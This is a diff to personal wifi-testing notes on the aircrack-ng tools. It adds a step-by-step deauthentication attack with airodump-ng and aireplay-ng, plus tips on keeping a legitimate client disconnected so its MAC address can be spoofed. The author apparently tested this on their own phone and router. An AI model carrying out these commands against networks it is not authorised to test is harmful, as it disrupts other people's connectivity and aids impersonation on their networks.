@@ -63,7 +63,7 @@ sudo airmon-ng stop wlan0mon
 Dump network traffic to file:
 airodump-ng is configured to scan exclusively for networks operating on the 2.4 GHz band so use `--band abg` if necessary
 ```
-sudo airodump-ng wlan1mon --band a -w dump
+sudo airodump-ng wlan1mon --band abg -w dump
 ```
 For a specific BSSID:
 ```
@@ -122,6 +122,12 @@ sudo airdecap-ng -p <passphrase> <capture-file> -e <essid>
 ```
 
 ## Deauth
+0. Do setup
+1. Run airmon-ng to file and see everything: `sudo airodump-ng wlan1mon --band abg -w []]`
+2. Find your AP BSSID or ESSID amongst files: `cat []-01.csv | grep -i Lands`
+3. Run airmon-ng specifically on BSSID or ESSID + correct channel: `sudo airodump-ng wlan1mon --bssid [] --channel [] -w []`
+4. Find target client's BSSID to deauth: `STATIONS`
+5. Run aireplay-ng on it: `sudo aireplay-ng -0 5 -a ACCESSPOINTBSSID -c CLIENTBSSID wlan1mon`
 - `5` is the number of deauth packets, `0` would be to send them continously.
 - `-0` = deauth attack (`--deauth` would also work here)
 ```
@@ -135,6 +141,12 @@ iwconfig wlan1mon channel X
 # EXTRAS
 - Note that it is possible to connect to APs via CLI
 - Your phone will randomise it's MAC address when it connects to a network, you can see it `Wifi` --> `Settings` --> `View more`
+- When testing on phone, it should deauth nearly immediately.
+- Router was hiding 2 networks (2.4/5) behind one ESSID, deauthing my phone from one would make it silently switch to the other. Segregating the 2 networks into their own uniquely named networks allowed me to deauth the phone from the network without it reauthing to the other. 'Forgetting' the other network also helped I think to it wouldn't reconnect.
+- Remember 2 devices can't connect to the same network with the same MAC address so either:
+  - Perpetually deauth legit client to free up space however it's most effective when the client we're mimicking is not currently connected to our target network at all.
+  - Connect to the other frequency the device isn't connected to on the network (5 or 2.4)
+
 
 
 ## Rasberry Pi MAC address ranges:
